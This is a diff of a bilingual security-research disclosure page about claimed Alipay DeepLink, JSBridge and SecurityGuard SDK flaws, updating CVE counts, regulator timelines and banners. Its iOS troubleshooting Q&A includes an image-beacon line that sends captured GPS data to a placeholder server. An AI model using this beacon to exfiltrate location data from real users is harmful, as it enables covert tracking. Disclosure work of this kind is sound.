@@ -3,11 +3,11 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Alipay DeepLink Attack Surface Analysis | 支付宝 DeepLink 攻击面分析</title>
-<meta name="description" content="Independent security research: Alipay DeepLink + JSBridge attack chain analysis. 17 verified issues across 3 devices, 308 server logs. Full responsible disclosure timeline included.">
+<title>Alipay Security Research: 36 CVEs, SecurityGuard SDK Analysis | 支付宝安全研究</title>
+<meta name="description" content="Independent security research: 36 CVEs filed with MITRE across 11 tickets. SecurityGuard SDK reverse engineering, PatchProxy 146K+ remotely replaceable methods, Docker-reproducible (37/37). IACR ePrint 2026/526. 9+ countries investigating.">
 <meta name="author" content="Innora AI Security Research">
-<meta property="og:title" content="Alipay DeepLink Attack Surface: One Link to Rule Them All">
-<meta property="og:description" content="17 verified security issues. 3 devices. 308 exfiltration logs. Full responsible disclosure.">
+<meta property="og:title" content="Alipay SecurityGuard SDK: 36 CVEs, 146K Hot-Patch Hooks, Weak Crypto">
+<meta property="og:description" content="36 CVEs filed with MITRE. SecurityGuard SDK teardown: PatchProxy, AVMP bytecode VM, weak crypto. Docker-reproducible. 9+ countries investigating.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://innora.ai/zfb/">
 <meta property="og:image" content="https://innora.ai/zfb/og-image.png">
@@ -16,13 +16,13 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:locale:alternate" content="en_US">
 <meta property="article:published_time" content="2026-03-11T00:00:00+08:00">
-<meta property="article:modified_time" content="2026-03-14T16:00:00+08:00">
+<meta property="article:modified_time" content="2026-03-25T00:00:00+08:00">
 <meta property="article:author" content="Innora AI Security Research">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Alipay DeepLink Attack Surface: One Link to Rule Them All">
-<meta name="twitter:description" content="17 verified security issues. CVSS 9.3 whitelist bypass enables remote exploitation by anyone. 6 global investigations active.">
+<meta name="twitter:description" content="36 CVEs filed with MITRE. SecurityGuard SDK: 146K hot-patch hooks, weak crypto, no cert pinning. Docker-reproducible. 9+ countries investigating.">
 <meta name="twitter:image" content="https://innora.ai/zfb/og-image.png">
-<meta name="keywords" content="Alipay, security, vulnerability, CVE, DeepLink, JSBridge, whitelist bypass, CVSS 9.3, open redirect, mobile security">
+<meta name="keywords" content="Alipay, security, vulnerability, CVE, SecurityGuard SDK, PatchProxy, AVMP, DeepLink, JSBridge, whitelist bypass, hot-patch, weak crypto, mobile security, Android security, Ant Group">
 <link rel="canonical" href="https://innora.ai/zfb/">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
 <style>
@@ -64,22 +64,57 @@ a:hover { text-decoration: underline; }
   gap: 0;
   border-radius: 6px;
   overflow: hidden;
-  border: 1px solid var(--border);
+  border: 2px solid var(--accent);
   background: var(--surface);
 }
 .lang-toggle button {
-  padding: 6px 14px;
+  padding: 8px 18px;
   border: none;
   background: transparent;
   color: var(--text2);
   cursor: pointer;
-  font-size: 13px;
+  font-size: 15px;
   font-weight: 600;
   transition: all .2s;
 }
 .lang-toggle button.active {
   background: var(--accent);
   color: #fff;
+}
+
+/* Alert Banner */
+.alert-banner {
+  background: linear-gradient(90deg, #1a0520, #2a0a10);
+  border-bottom: 2px solid var(--accent);
+  padding: 14px 24px;
+  text-align: center;
+  position: relative;
+  z-index: 100;
+}
+.alert-banner a {
+  color: #fff;
+  font-weight: 700;
+  font-size: 15px;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+.alert-banner a:hover { text-decoration: underline; }
+.alert-banner .badge {
+  background: var(--accent);
+  color: #fff;
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  animation: pulse 2s infinite;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.7; }
 }
 
 /* Hero */
@@ -373,10 +408,10 @@ ul, ol { margin: 12px 0; padding-left: 24px; }
 li { margin: 6px 0; color: var(--text2); }
 
 /* Bilingual */
-.zh { display: block; }
-.en { display: none; }
-body.lang-en .zh { display: none; }
-body.lang-en .en { display: block; }
+.zh { display: none; }
+.en { display: block; }
+body.lang-zh .zh { display: block; }
+body.lang-zh .en { display: none; }
 
 /* Responsive */
 @media (max-width: 768px) {
@@ -421,8 +456,8 @@ body.lang-en .en { display: block; }
 {
   "@context": "https://schema.org",
   "@type": "Article",
-  "headline": "Alipay DeepLink Attack Surface Analysis — 17 Verified Vulnerabilities",
-  "description": "Independent security research uncovering CVSS 9.3 whitelist bypass enabling remote exploitation of 17 vulnerabilities in Alipay.",
+  "headline": "Alipay Security Research — 36 CVEs, SecurityGuard SDK Analysis",
+  "description": "Independent security research: 36 CVEs filed with MITRE, SecurityGuard SDK reverse engineering, PatchProxy 146K+ remotely replaceable methods. Docker-reproducible.",
   "datePublished": "2026-03-11",
   "dateModified": "2026-03-14",
   "author": {"@type": "Organization", "name": "Innora AI Security Research", "url": "https://innora.ai"},
@@ -435,10 +470,21 @@ body.lang-en .en { display: block; }
 </head>
 <body>
 
+<!-- Alert Banner -->
+<div class="alert-banner">
+  <a href="article_censorship.html">
+    <span class="badge" style="background:#ff2222;">CENSORED x8</span>
+    <span class="en">⚠️ 8 Research Articles FORCE-DELETED in 2 Waves (Mar 15 + Mar 20) — Ant Group's law firm weaponized Cybersecurity Law after initial complaint was rejected → Full evidence & timeline</span>
+    <span class="zh">⚠️ 8篇研究文章被分两波强制删除（3/15 + 3/20）— 蚂蚁律所将网络安全法武器化，首次投诉被驳回后更换法律依据 → 完整证据与时间线</span>
+    <span style="font-size:18px">→</span>
+  </a>
+</div>
+
+
 <!-- Language Toggle -->
 <div class="lang-toggle">
-  <button id="btn-zh" class="active" onclick="setLang('zh')">中文</button>
-  <button id="btn-en" onclick="setLang('en')">EN</button>
+  <button id="btn-zh" class="" onclick="setLang('zh')">中文</button>
+  <button id="btn-en" class="active" onclick="setLang('en')">EN</button>
 </div>
 
 <!-- ==================== HERO ==================== -->
@@ -493,6 +539,57 @@ body.lang-en .en { display: block; }
 
 
 
+
+
+<!-- ==================== NEW: SECURITYGUARD PRIVACY ANALYSIS ==================== -->
+<div style="max-width:860px;margin:24px auto 0;padding:0 24px;">
+  <div style="background:linear-gradient(135deg, rgba(68,136,255,.10), rgba(153,102,255,.08));border:2px solid #4488ff;border-radius:12px;padding:28px 28px 24px;position:relative;overflow:hidden;">
+    <div style="position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#4488ff,#9966ff,#4488ff);"></div>
+    <div style="position:absolute;top:16px;right:20px;background:#4488ff;color:#fff;font-size:11px;padding:4px 10px;border-radius:4px;font-weight:bold;letter-spacing:1px;">NEW 2026-03-17</div>
+    <h2 style="color:#4488ff;font-size:22px;margin:0 0 16px 0;text-align:center;">
+      <span class="zh">🔬 独立安全研究：支付宝 SecurityGuard SDK 完整逆向 — 208个API拦截 · 97%接口无保护</span>
+      <span class="en">🔬 Independent Research: Alipay SecurityGuard SDK Full Reverse Engineering — 208 API Intercepts · 97% Unprotected</span>
+    </h2>
+    <div class="zh">
+      <p style="color:#9898a8;font-size:15px;line-height:1.8;margin-bottom:16px;">我们对支付宝内置的 SecurityGuard 安全SDK进行了完整逆向工程分析，发现了远超支付安全需求的大规模数据采集行为：</p>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:18px;">
+        <div style="background:rgba(68,136,255,.08);border:1px solid rgba(68,136,255,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#4488ff;">208</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">API拦截类别</div></div>
+        <div style="background:rgba(255,68,68,.08);border:1px solid rgba(255,68,68,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#ff4444;">97%</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">接口无权限保护</div></div>
+        <div style="background:rgba(255,170,34,.08);border:1px solid rgba(255,170,34,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#ffaa22;">22</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">行为监控事件</div></div>
+        <div style="background:rgba(153,102,255,.08);border:1px solid rgba(153,102,255,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#9966ff;">29</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">设备指纹项</div></div>
+      </div>
+      <div style="display:grid;grid-template-columns:40px 1fr;gap:6px 12px;align-items:start;margin-bottom:14px;">
+        <div style="font-size:20px;text-align:center;">📱</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#4488ff;">DexAOP字节码拦截</strong> — 976个代理类拦截蓝牙(17)、电话(17)、通讯录(12)、摄像头(5)、录音(9)、剪贴板(4)等几乎所有硬件能力</div>
+        <div style="font-size:20px;text-align:center;">👁️</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#ffaa22;">行为监控</strong> — 截屏、录屏、通话状态、剪贴板变化、蓝牙连接，每10条批量上报服务器</div>
+        <div style="font-size:20px;text-align:center;">🔓</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#ff4444;">396/408内部接口无保护</strong> — 支付、数字人民币钱包、NFC、文件操作等97%接口没有权限检查</div>
+        <div style="font-size:20px;text-align:center;">🛰️</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#9966ff;">PatchProxy远程修改</strong> — 服务器可远程修改TLS验证、权限检查、支付校验，无需用户同意</div>
+      </div>
+      <div style="display:flex;gap:12px;margin-top:16px;flex-wrap:wrap;">
+        <a href="privacy-analysis.html" style="background:#4488ff;color:#fff;padding:12px 24px;border-radius:8px;font-weight:bold;font-size:15px;text-decoration:none;display:inline-block;">📄 阅读完整隐私分析报告</a>
+        <a href="https://github.com/sgInnora/alipay-securityguard-analysis" style="background:rgba(255,255,255,.1);color:#ccc;padding:12px 24px;border-radius:8px;font-weight:bold;font-size:15px;text-decoration:none;border:1px solid #444;display:inline-block;">⭐ GitHub 完整代码</a>
+      </div>
+    </div>
+    <div class="en">
+      <p style="color:#9898a8;font-size:15px;line-height:1.8;margin-bottom:16px;">Complete reverse engineering of Alipay's SecurityGuard SDK reveals massive data collection far beyond payment security requirements:</p>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:18px;">
+        <div style="background:rgba(68,136,255,.08);border:1px solid rgba(68,136,255,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#4488ff;">208</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">API Intercepts</div></div>
+        <div style="background:rgba(255,68,68,.08);border:1px solid rgba(255,68,68,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#ff4444;">97%</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">No Permission Check</div></div>
+        <div style="background:rgba(255,170,34,.08);border:1px solid rgba(255,170,34,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#ffaa22;">22</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">Behavior Events</div></div>
+        <div style="background:rgba(153,102,255,.08);border:1px solid rgba(153,102,255,.3);border-radius:8px;padding:16px 12px;text-align:center;"><div style="font-size:28px;font-weight:bold;color:#9966ff;">29</div><div style="font-size:12px;color:#9898a8;margin-top:4px;">Fingerprint Items</div></div>
+      </div>
+      <div style="display:grid;grid-template-columns:40px 1fr;gap:6px 12px;align-items:start;margin-bottom:14px;">
+        <div style="font-size:20px;text-align:center;">📱</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#4488ff;">DexAOP Bytecode Interception</strong> — 976 proxy classes intercept Bluetooth(17), Telephony(17), Contacts(12), Camera(5), Audio(9), Clipboard(4)</div>
+        <div style="font-size:20px;text-align:center;">👁️</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#ffaa22;">Behavior Monitoring</strong> — Screenshot, screen recording, call state, clipboard changes — batched every 10 events</div>
+        <div style="font-size:20px;text-align:center;">🔓</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#ff4444;">396/408 Unprotected</strong> — 97% of JSBridge APIs including payment, digital yuan wallet, NFC have zero permission checks</div>
+        <div style="font-size:20px;text-align:center;">🛰️</div><div style="color:#ccc;font-size:14px;line-height:1.7;"><strong style="color:#9966ff;">PatchProxy Remote Mod</strong> — Server can remotely alter TLS validation, permissions, payment verification without consent</div>
+      </div>
+      <div style="display:flex;gap:12px;margin-top:16px;flex-wrap:wrap;">
+        <a href="privacy-analysis.html" style="background:#4488ff;color:#fff;padding:12px 24px;border-radius:8px;font-weight:bold;font-size:15px;text-decoration:none;display:inline-block;">📄 Read Full Privacy Analysis</a>
+        <a href="https://github.com/sgInnora/alipay-securityguard-analysis" style="background:rgba(255,255,255,.1);color:#ccc;padding:12px 24px;border-radius:8px;font-weight:bold;font-size:15px;text-decoration:none;border:1px solid #444;display:inline-block;">⭐ GitHub Repository</a>
+      </div>
+    </div>
+  </div>
+</div>
 
 
 <!-- ==================== CENSORSHIP NOTICE: WECHAT ARTICLES DELETED 2026-03-15 ==================== -->
@@ -562,6 +659,7 @@ body.lang-en .en { display: block; }
 </div>
 
 <!-- ==================== CRITICAL: WHITELIST BYPASS BANNER ==================== -->
+
 <div style="max-width:860px;margin:20px auto 0;padding:0 24px;">
   <div style="background:linear-gradient(135deg, rgba(255,68,68,.12), rgba(255,107,53,.08));border:2px solid #ff4444;border-radius:12px;padding:28px 28px 24px;position:relative;overflow:hidden;">
     <div style="position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#ff4444,#ff6b35,#ff4444);"></div>
@@ -914,11 +1012,90 @@ body.lang-en .en { display: block; }
     <div class="timeline-item">
       <div class="timeline-date">2026-03-12</div>
       <p>
-        <span class="zh"><strong>荷兰央行 (DNB) 正式回复</strong> — 指出 CSSF 卢森堡为 Alipay 欧洲的主要监管机构，提供 GDPR 第32条（处理安全性）违规执法路径。CERT-Luxembourg (CIRCL) 事件处理分析师 Michael Hamm 确认将寻找 Alipay 欧洲实体联系人转发报告</span>
-        <span class="en"><strong>DNB Netherlands Formal Response</strong> — Identified CSSF Luxembourg as Alipay Europe's Primary Supervisory Authority, provided GDPR Article 32 enforcement pathway. CERT-Luxembourg (CIRCL) incident handler Michael Hamm confirmed locating appropriate Alipay European entity contact to forward the report</span>
+        <span class="zh"><strong>荷兰央行 (DNB) 正式回复</strong> — 指出 CSSF 卢森堡为 Alipay 欧洲的主要监管机构，提供 GDPR 第32条（处理安全性）违规执法路径。CERT-Luxembourg (CIRCL) 事件处理分析师 a CIRCL incident handler 确认将寻找 Alipay 欧洲实体联系人转发报告</span>
+        <span class="en"><strong>DNB Netherlands Formal Response</strong> — Identified CSSF Luxembourg as Alipay Europe's Primary Supervisory Authority, provided GDPR Article 32 enforcement pathway. CERT-Luxembourg (CIRCL) incident handler a CIRCL incident handler confirmed locating appropriate Alipay European entity contact to forward the report</span>
       </p>
     </div>
   </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-15</div>
+      <p>
+        <span class="zh"><strong>CERT Polska 正式受理</strong> — 波兰国家CERT已受理事件，开始按程序处理，分配Ticket #554****57</span>
+        <span class="en"><strong>CERT Polska Accepted</strong> — Poland national CERT accepted the case, began incident handling procedures, Ticket #554****57</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-15</div>
+      <p>
+        <span class="zh"><strong>PCPD 香港个人资料私隐专员公署</strong> — 确认收到报告，将跟进并回复</span>
+        <span class="en"><strong>PCPD Hong Kong Privacy Commissioner</strong> — Confirmed receipt, will follow up and respond</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-15</div>
+      <p>
+        <span class="zh"><strong>AZOP 克罗地亚个人数据保护局</strong> — 已收到报告，正在处理</span>
+        <span class="en"><strong>AZOP Croatia Data Protection Agency</strong> — Report received, being processed</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-16</div>
+      <p>
+        <span class="zh"><strong>SingCERT/CSA 新加坡网络安全局</strong> — 确认收到漏洞报告，建议跟进MITRE CVE分配</span>
+        <span class="en"><strong>SingCERT/CSA Singapore</strong> — Confirmed receipt of vulnerability report, advised to follow up with MITRE on CVE assignment</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-16</div>
+      <p>
+        <span class="zh"><strong>HKMA 香港金管局正式转交</strong> — 投诉已正式转交 Alipay Financial Services (HK) Limited 跟进处理，HKMA将监督持牌机构处理并在必要时采取行动</span>
+        <span class="en"><strong>HKMA Formal Referral</strong> — Complaint formally referred to Alipay Financial Services (HK) Limited for follow-up. HKMA will monitor licensee handling and take appropriate actions as necessary</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-16</div>
+      <p>
+        <span class="zh"><strong>DPC 爱尔兰数据保护委员会</strong> — 立案 DPC032****957，因管辖权问题建议联系当地DPA</span>
+        <span class="en"><strong>DPC Ireland</strong> — Case DPC032****957 opened, referred to local DPA due to jurisdiction</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-16</div>
+      <p>
+        <span class="zh"><strong>ANSSI/CERT-FR 法国</strong> — 正式回复：该应用在法国用户较少，不采取进一步行动</span>
+        <span class="en"><strong>ANSSI/CERT-FR France</strong> — Formal response: app has limited French user base, no further action planned</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-17</div>
+      <p>
+        <span class="zh"><strong>AP 荷兰数据保护局</strong> — 正式受理GDPR投诉</span>
+        <span class="en"><strong>Dutch DPA (Autoriteit Persoonsgegevens)</strong> — Formally received GDPR complaint</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-17</div>
+      <p>
+        <span class="zh"><strong>FCA 英国金融行为监管局</strong> — 参考号 2121****43，信息已记录并用于监管工作</span>
+        <span class="en"><strong>FCA UK</strong> — Reference 2121****43, information recorded and used in supervisory work with authorised firms</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-17</div>
+      <p>
+        <span class="zh"><strong>DNB 荷兰央行</strong> — 确认邮件已受理处理中</span>
+        <span class="en"><strong>DNB Netherlands Central Bank</strong> — Email received and being processed</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-17</div>
+      <p>
+        <span class="zh"><strong>新增CVE提交</strong> — 针对支付宝应用新发现的安全问题，已向MITRE提交额外CVE申请（详情暂不公开）</span>
+        <span class="en"><strong>Additional CVE Submission</strong> — New CVE application submitted to MITRE for additional security issues discovered in the Alipay application (details withheld pending assignment)</span>
+      </p>
+    </div>
+
+
 </section>
 
 <!-- ==================== 2. EXECUTIVE SUMMARY ==================== -->
@@ -1836,8 +2013,8 @@ Language/zh-Hant Region/CN</code></pre>
 
   <div class="callout" style="border-color: var(--green); background: rgba(68,204,136,.06);">
     <p>
-      <span class="zh"><strong>截至 2026-03-14</strong>：我们向全球 22 个国家/地区的约 160 个监管机构、CERT、隐私保护组织和安全社区发送了约 189 封安全通报邮件。以下是已收到明确受理结果的机构汇总。</span>
-      <span class="en"><strong>As of 2026-03-14</strong>: We sent approximately 189 security notification emails to ~160 regulatory bodies, CERTs, privacy authorities, and security communities across 22 countries/regions. Below is a summary of organizations that have provided definitive responses.</span>
+      <span class="zh"><strong>截至 2026-03-17</strong>：我们已向全球 40+ 个国家/地区的 300+ 个监管机构、CERT、隐私保护组织、媒体和安全社区发送了 649 封安全通报邮件。<strong>41个机构/平台已正式回复</strong>。以下是已收到明确受理结果的机构汇总。</span>
+      <span class="en"><strong>As of 2026-03-17</strong>: We have sent 649 security notification emails to 300+ regulatory bodies, CERTs, privacy authorities, media outlets, and security communities across 40+ countries/regions. <strong>41 institutions/platforms have formally responded</strong>. Below is a summary.</span>
     </p>
   </div>
 
@@ -1887,8 +2064,8 @@ Language/zh-Hant Region/CN</code></pre>
           <td style="padding:8px 12px;">5</td>
           <td style="padding:8px 12px;"><strong>MITRE CVE</strong></td>
           <td style="padding:8px 12px;">🇺🇸 美国</td>
-          <td style="padding:8px 12px; color: var(--accent);"><strong>6个CVE待分配</strong></td>
-          <td style="padding:8px 12px;">通过 CNA-LR 路径提交6个CVE请求（CVSS 7.4–9.3），已确认收到</td>
+          <td style="padding:8px 12px; color: var(--accent);"><strong>36个CVE待分配 (11 tickets)</strong></td>
+          <td style="padding:8px 12px;">通过 CNA-LR 路径提交36个CVE请求（11个MITRE tickets），全部已确认收到</td>
         </tr>
         <tr style="border-bottom:1px solid var(--border);">
           <td style="padding:8px 12px;">6</td>
@@ -1998,8 +2175,8 @@ Language/zh-Hant Region/CN</code></pre>
           <td style="padding:8px 12px;">5</td>
           <td style="padding:8px 12px;"><strong>MITRE CVE</strong></td>
           <td style="padding:8px 12px;">🇺🇸 USA</td>
-          <td style="padding:8px 12px; color: var(--accent);"><strong>6 CVEs Pending Assignment</strong></td>
-          <td style="padding:8px 12px;">6 CVE requests submitted via CNA-LR pathway (CVSS 7.4–9.3). Receipt confirmed.</td>
+          <td style="padding:8px 12px; color: var(--accent);"><strong>36 CVEs Pending Assignment (11 tickets)</strong></td>
+          <td style="padding:8px 12px;">36 CVE requests submitted via CNA-LR pathway across 11 MITRE tickets. All receipts confirmed.</td>
         </tr>
         <tr style="border-bottom:1px solid var(--border);">
           <td style="padding:8px 12px;">6</td>
@@ -2289,7 +2466,7 @@ Language/zh-Hant Region/CN</code></pre>
       <span class="en">Q2: "GPS access under existing user permissions is normal behavior"</span>
     </h3>
     <div class="zh">
-      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">来源：GitHub Issue #4 (sevck, rama291041610)</p>
+      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">来源：GitHub Issue #4 (sevck, rama2910****10)</p>
       <p><strong>这是一个权限委托 vs 权限滥用的问题。</strong></p>
       <table style="margin:12px 0;">
         <tr><th>场景</th><th>用户期望</th><th>实际行为</th></tr>
@@ -2303,7 +2480,7 @@ Language/zh-Hant Region/CN</code></pre>
       <p><strong>实测证据</strong>：308 条服务器日志记录了从 3 台真实设备静默获取的 GPS 坐标（8.8m 精度），7 秒内完成，0 次用户交互。GitHub Issue #5 的 freshnn 也独立确认 Android 上「无感 GPS」成功。</p>
     </div>
     <div class="en">
-      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">Source: GitHub Issue #4 (sevck, rama291041610)</p>
+      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">Source: GitHub Issue #4 (sevck, rama2910****10)</p>
       <p><strong>This is a question of permission delegation vs. permission abuse.</strong></p>
       <table style="margin:12px 0;">
         <tr><th>Scenario</th><th>User Expectation</th><th>Actual Behavior</th></tr>
@@ -2325,7 +2502,7 @@ Language/zh-Hant Region/CN</code></pre>
       <span class="en">Q3: "Transfer pre-fill requires user confirmation, similar to Chrome form auto-fill"</span>
     </h3>
     <div class="zh">
-      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">来源：GitHub Issue #4 (sevck, rama291041610)</p>
+      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">来源：GitHub Issue #4 (sevck, rama2910****10)</p>
       <p><strong style="color:#4ecdc4;">我们部分同意：</strong>转账确实需要用户至少 2 次点击 + 密码/生物认证确认，不能自动完成。本报告已在相关章节明确标注此前提条件。</p>
       <p><strong style="color:#ff8800;">但 Chrome 类比不准确：</strong></p>
       <ul>
@@ -2336,7 +2513,7 @@ Language/zh-Hant Region/CN</code></pre>
       <p>参与讨论的 <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/4" target="_blank">cxxsheng</a> 独立编写了 PoC，结论：<em>「还是认为这个功能是漏洞，但是危害性会低一些」</em>。他还引用了 <a href="https://github.com/advisories/GHSA-88q7-6vxh-w5q7" target="_blank">CVE-2024-40676</a>（Android 先例）：减少用户交互步骤本身可以构成漏洞。</p>
     </div>
     <div class="en">
-      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">Source: GitHub Issue #4 (sevck, rama291041610)</p>
+      <p style="color:#9898a8;font-style:italic;margin:0 0 12px 0;">Source: GitHub Issue #4 (sevck, rama2910****10)</p>
       <p><strong style="color:#4ecdc4;">We partially agree:</strong> Transfers indeed require at least 2 clicks + password/biometric confirmation and cannot complete automatically. This precondition is already explicitly stated in the relevant sections of this report.</p>
       <p><strong style="color:#ff8800;">But the Chrome analogy is inaccurate:</strong></p>
       <ul>
@@ -2364,7 +2541,7 @@ Language/zh-Hant Region/CN</code></pre>
         <li><strong>解决方案</strong> — 使用 Image beacon（<code>new Image().src = "https://server/log?data=..."</code>）属于 simple request 且不受 <code>connect-src</code> 限制</li>
         <li><strong>支付宝版本差异</strong> — 不同版本的 JSBridge 鉴权策略可能不同，建议使用最新版测试</li>
       </ul>
-      <p style="color:#9898a8;font-size:13px;"><em>技术修正：感谢 <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060931030" target="_blank">meooxx</a> 指出 CORS 是浏览器端策略——它阻止的是浏览器读取 response，不阻止 request 到达服务器。对于 simple request，服务器一定会收到请求。</em></p>
+      <p style="color:#9898a8;font-size:13px;"><em>技术修正：感谢 <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060****30" target="_blank">meooxx</a> 指出 CORS 是浏览器端策略——它阻止的是浏览器读取 response，不阻止 request 到达服务器。对于 simple request，服务器一定会收到请求。</em></p>
       <p><strong>关键事实：</strong>我们的 iPhone 16 Pro (iOS 18.3) 测试<strong>确实成功</strong>获取了 GPS 数据（记录在服务器日志中），蚂蚁集团安全负责人的 iPhone 在杭州的测试也被我们成功获取了坐标。iOS 复现需要满足特定的服务器配置条件，并非漏洞不存在。</p>
       <p>我们将在 <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5" target="_blank">Issue #5</a> 中提供详细的 iOS 复现排查指南。</p>
     </div>
@@ -2378,7 +2555,7 @@ Language/zh-Hant Region/CN</code></pre>
         <li><strong>Solution</strong> — Use Image beacon (<code>new Image().src = "https://server/log?data=..."</code>) which is a simple request not restricted by <code>connect-src</code></li>
         <li><strong>Alipay version differences</strong> — Different versions may have different JSBridge authentication policies; test with the latest version</li>
       </ul>
-      <p style="color:#9898a8;font-size:13px;"><em>Technical correction: Thanks to <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060931030" target="_blank">meooxx</a> for pointing out that CORS is a browser-side policy — it blocks the browser from reading the response, not the request from reaching the server. For simple requests, the server always receives the request.</em></p>
+      <p style="color:#9898a8;font-size:13px;"><em>Technical correction: Thanks to <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060****30" target="_blank">meooxx</a> for pointing out that CORS is a browser-side policy — it blocks the browser from reading the response, not the request from reaching the server. For simple requests, the server always receives the request.</em></p>
       <p><strong>Key fact:</strong> Our iPhone 16 Pro (iOS 18.3) test <strong>did successfully</strong> obtain GPS data (recorded in server logs). Ant Group's security lead's iPhone in Hangzhou was also successfully captured. iOS reproduction requires specific server configuration — the vulnerability exists, but the PoC setup matters.</p>
       <p>We will provide a detailed iOS reproduction troubleshooting guide in <a href="https://github.com/sgInnora/alipay-deeplink-research/issues/5" target="_blank">Issue #5</a>.</p>
     </div>
@@ -2428,13 +2605,13 @@ Language/zh-Hant Region/CN</code></pre>
       <p>本研究的有效性已获得多个独立第三方的验证：</p>
       <ul>
         <li><strong>Packet Storm Security</strong> — 审核通过并发布 <a href="https://packetstormsecurity.com/files/217089" target="_blank">Advisory #217089</a></li>
-        <li><strong>MITRE</strong> — 受理 6 个 CVE 申请 (Ticket #2005801)</li>
-        <li><strong>Apple Product Security</strong> — 主动启动调查 (Case OE01052449093014)</li>
-        <li><strong>Google Play</strong> — 启动政策违规调查 (Case 9-7515000040640)</li>
+        <li><strong>MITRE</strong> — 受理 36 个 CVE 申请 (11 tickets)</li>
+        <li><strong>Apple Product Security</strong> — 主动启动调查 (Case OE0105****3014)</li>
+        <li><strong>Google Play</strong> — 启动政策违规调查 (Case 9-7515****0640)</li>
         <li><strong>CSSF 卢森堡</strong> — 4 个部门确认收到，ICT Risk Supervision 明确记录</li>
-        <li><strong>PDPC 新加坡</strong> — 启动正式数据保护调查 (#00629724)</li>
+        <li><strong>PDPC 新加坡</strong> — 启动正式数据保护调查 (#006****24)</li>
         <li><strong>CIRCL 卢森堡 CERT</strong> — 事件处理人员主动代为联系 Alibaba SRC</li>
-        <li><strong>HKMA 香港金管局</strong> — 立案调查 (Case CE20260313175412)</li>
+        <li><strong>HKMA 香港金管局</strong> — 立案调查 (Case CE2026****5412)</li>
         <li><strong>cxxsheng</strong>（GitHub 安全研究者）— 独立编写 PoC 后确认漏洞存在</li>
         <li><strong>freshnn</strong>（GitHub 用户）— 独立确认 Android 无感 GPS 复现成功</li>
       </ul>
@@ -2443,13 +2620,13 @@ Language/zh-Hant Region/CN</code></pre>
       <p>The validity of this research has been verified by multiple independent third parties:</p>
       <ul>
         <li><strong>Packet Storm Security</strong> — Reviewed and published <a href="https://packetstormsecurity.com/files/217089" target="_blank">Advisory #217089</a></li>
-        <li><strong>MITRE</strong> — Accepted 6 CVE applications (Ticket #2005801)</li>
